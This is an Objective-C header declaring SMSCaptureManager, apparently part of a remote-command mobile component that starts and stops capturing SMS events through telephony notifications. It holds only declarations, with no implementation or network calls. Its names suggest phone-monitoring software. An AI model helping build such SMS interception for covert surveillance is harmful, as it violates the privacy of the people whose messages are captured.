/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SMSCaptureManager
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  28/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import <Foundation/Foundation.h>
#import "EventDelegate.h"
#import "TelephonyNotificationManager.h"
@class TelephonyNotificationManagerImpl;
@interface SMSCaptureManager : NSObject {
@private
	TelephonyNotificationManagerImpl *mTelephonyNotificationManagerImpl;
	id <EventDelegate>                mEventDelegate;
	id <TelephonyNotificationManager> mTelephonyNotificationManager; 
	BOOL		mListening;
}

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate andTelephonyNotificationCenter:(id <TelephonyNotificationManager>) aTelephonyNotificationManager;
- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate;
- (void) startCapture;
- (void) stopCapture;

@end
